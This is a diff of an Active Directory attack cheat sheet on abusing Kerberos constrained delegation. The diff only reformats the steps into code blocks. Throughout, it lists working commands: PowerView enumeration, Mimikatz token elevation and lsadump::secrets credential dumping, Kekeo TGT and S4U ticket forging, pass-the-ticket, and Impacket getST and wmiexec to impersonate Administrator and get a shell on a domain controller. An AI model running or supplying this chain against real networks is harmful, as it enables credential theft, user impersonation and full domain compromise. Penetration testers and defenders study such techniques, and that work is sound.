@@ -16,41 +16,73 @@
 
 ## Example:
 
-#### 1) Import-Module c:\tools\Powerview.ps1
+#### 1) 
 
-#### 2) Get-NetUser -TrustedToAuth
+    Import-Module c:\tools\Powerview.ps1
 
-#### 3) mimikatz.exe
+#### 2) 
 
-#### 4) token::elevate
+    Get-NetUser -TrustedToAuth
 
-#### 5) lsadump::secrets (Pulls clear text credentials from registry hive)
+#### 3) 
+
+    mimikatz.exe
+
+#### 4) 
+
+    token::elevate
+
+#### 5) 
+
+    lsadump::secrets (Pulls clear text credentials from registry hive)
 
 #### 6) Exit mimikatz after "token::elevate" command
 
-#### 7) kekeo.exe
+#### 7) 
 
-#### 8) tgt::ask /user:USER/SERVICE /domain:DOMAIN /password:PASSWORD
+    kekeo.exe
 
-#### 9) tgs::s4u /tgt:TICKET.KIRBI /user:USER /service:SERVICE *You can run same command to impersonate more services.
+#### 8) 
 
-#### 10) mimikatz
+    tgt::ask /user:USER/SERVICE /domain:DOMAIN /password:PASSWORD
 
-#### 11) privilege::debug
+#### 9) 
 
-#### 12) kerberos::ptt TICKET.KIRBI
+    tgs::s4u /tgt:TICKET.KIRBI /user:USER /service:SERVICE *You can run same command to impersonate more services.
 
-#### 13) kerberos::ptt TICKET2.KIRBI
+#### 10) 
 
-#### 14) klist
+    mimikatz
+
+#### 11) 
+
+    privilege::debug
+
+#### 12) 
+
+    kerberos::ptt TICKET.KIRBI
+
+#### 13) 
+
+    kerberos::ptt TICKET2.KIRBI
+
+#### 14) 
+
+    klist
 
 ## REMOTE EXPLOITATION EXAMPLE:
 
-#### 1) Impacket-getST -k -impersonate Administrator -spn CIFS/DC.DOMAIN.LOCAL DOMAIN.LOCAL/USERNAME
+#### 1) 
 
-#### 2) export KRB5CCNAME=Administrator.ccache
+    Impacket-getST -k -impersonate Administrator -spn CIFS/DC.DOMAIN.LOCAL DOMAIN.LOCAL/USERNAME
 
-#### 3) impacket-wmiexec DOMAIN.LOCAL/Administrator@DC.DOMAIN.LOCAL -k -no-pass
+#### 2) 
+
+    export KRB5CCNAME=Administrator.ccache
+
+#### 3) 
+
+    impacket-wmiexec DOMAIN.LOCAL/Administrator@DC.DOMAIN.LOCAL -k -no-pass
 
 # Kerberos Constrained Delegation
 
